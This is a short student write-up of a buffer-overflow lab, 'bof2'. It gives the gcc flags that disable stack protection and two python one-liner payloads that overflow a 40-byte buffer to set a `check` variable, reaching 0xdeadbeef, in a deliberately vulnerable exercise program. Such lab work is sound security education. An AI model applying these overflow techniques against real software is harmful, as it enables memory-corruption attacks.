# Lab bof2
Hà Quốc Tiến - 22110075<br>
## Target
- Change the value of `check`, so that it statisfy the if condition.
## Solution
- Stack frame<br>
![bof2_1](https://github.com/Quoctienha/InformationSecurity_Labs-/blob/main/Buffer-overflow/img/bof2_1.png)
- We review `bof2.c` and see that buf only take 40 bytes of data. But the `fgets()` can took 45 bytes, then we watch the stack frame and see that in order to change the `check` by using buffer-overflow. We need to insert 44 bytes of data (40 for `buf[40]`  + 4 for `check` ), so 45 at the `fgets()` is enough.
## Execution
1. Create `bof2.out` by using ` gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2`.<br>
2. We start buffer-overflowing 44 bytes of data into `buf[40]`.<br>
- First, let try to print `You are on the right way!`, by changing the `check` so that it doesn't = 0x04030201 and 0xdeadbeef.<br>
    > echo $(python -c "print('a'*40+'\x6b\x84\x04\x00')")| ./bof2.out<br>

    ![bof2_2](https://github.com/Quoctienha/InformationSecurity_Labs-/blob/main/Buffer-overflow/img/bof2_2.png)
- Second, let print out `Yeah! You win!`, by changing the `check` so that it = 0xdeadbeef<br>
    > echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')")| ./bof2.out

    ![bof2_3](https://github.com/Quoctienha/InformationSecurity_Labs-/blob/main/Buffer-overflow/img/bof2_3.png)
- And the lab is done.
